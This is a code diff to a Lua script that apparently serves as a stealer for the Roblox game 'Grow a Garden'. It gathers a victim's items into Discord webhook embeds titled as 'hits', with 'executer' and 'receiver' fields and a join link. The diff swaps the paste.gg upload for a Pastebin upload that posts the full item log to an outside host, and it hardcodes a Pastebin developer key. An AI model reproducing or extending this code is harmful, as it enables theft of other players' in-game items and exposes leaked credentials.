@@ -136,42 +136,34 @@ end
 local function buildItemsEmbed(items)
     return {
         title = "🎁 Items Received",
-description = string.format("```\n%s\n```", buildBackpackSection(items)),
+        description = string.format("``````", buildBackpackSection(items)),
         color = 5793266, -- blue-ish
     }
 end
 
-local function uploadToPasteGG(text)
-    local url = "https://api.paste.gg/v1/pastes"
-    local data = {
-        name = "GAG Item Log",
-        description = "All items from Grow a Garden logger",
-        expires = os.date("!%Y-%m-%dT%H:%M:%SZ", os.time() + 5 * 60 * 60), -- 5 hours from now
-        files = {{
-            name = "items.txt",
-            content = { format = "text", value = text }
-        }}
-    }
+-- PASTEBIN UPLOAD FUNCTION
+local PASTEBIN_DEV_KEY = "2GXZr-FQKQR15rYjoyFmogIiRIzNif9x" -- your dev key here
+
+local function uploadToPastebin(text)
+    local url = "https://pastebin.com/api/api_post.php"
+    local data = "api_dev_key=" .. PASTEBIN_DEV_KEY
+        .. "&api_option=paste"
+        .. "&api_paste_code=" .. HttpService:UrlEncode(text)
+        .. "&api_paste_private=1" -- 1 = unlisted, 0 = public
+        .. "&api_paste_expire_date=1D" -- 1 day, change as needed
+        .. "&api_paste_name=" .. HttpService:UrlEncode("GAG Item Log")
     local response
     pcall(function()
         response = req({
             Url = url,
             Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = HttpService:JSONEncode(data)
+            Headers = {["Content-Type"] = "application/x-www-form-urlencoded"},
+            Body = data
         })
     end)
-    print("PasteGG response:", response and response.Body) -- Debug output
-    if response and response.Body then
-        local parsed
-        local ok, err = pcall(function()
-            parsed = HttpService:JSONDecode(response.Body)
-        end)
-        if ok and parsed and parsed.result and parsed.result.id then
-            return "https://paste.gg/p/" .. parsed.result.id
-        else
-            warn("PasteGG JSON decode failed:", err)
-        end
+    print("Pastebin response:", response and response.Body)
+    if response and response.Body and tostring(response.Body):find("https://pastebin.com/") then
+        return tostring(response.Body)
     end
     return nil
 end
@@ -183,7 +175,7 @@ local function buildMainEmbed(executer, receiver, totalValue, foundRare, pasteLi
         {name = "🧑‍💻 Player Information", value = string.format("**Username:** `%s`\n**Receiver:** `%s`\n**Account Age:** `%s`", executer.Name, receiver, accountAge), inline = false},
         {name = "💰 Total Value", value = string.format("**%s¢**", formatValue(totalValue)), inline = false},
         {name = "🌴 Join with URL", value = string.format("[Join with URL](%s)", joinLink), inline = false},
-        {name = "📄 View all hits", value = pasteLink and string.format("[View all hits](%s) _(expires in ~5h)_", pasteLink) or "_Failed to upload paste!_", inline = false}
+        {name = "📄 View all hits", value = pasteLink and string.format("[View all hits](%s) _(expires in ~1d)_", pasteLink) or "_Failed to upload paste!_", inline = false}
     }
     return {
         title = "🥗 Grow A Garden Hit",
@@ -214,9 +206,9 @@ local function prettyWebhookData(executer, receiver)
             table.insert(topItems, item)
         end
     end
-    -- Always upload ALL items, not just extras
+    -- Always upload ALL items
     local pasteText = buildAllItemsText(items)
-local pasteLink = uploadToPasteGG(pasteText)
+    local pasteLink = uploadToPastebin(pasteText)
     return {
         content = (foundRare and "@everyone" or ""),
         embeds = {
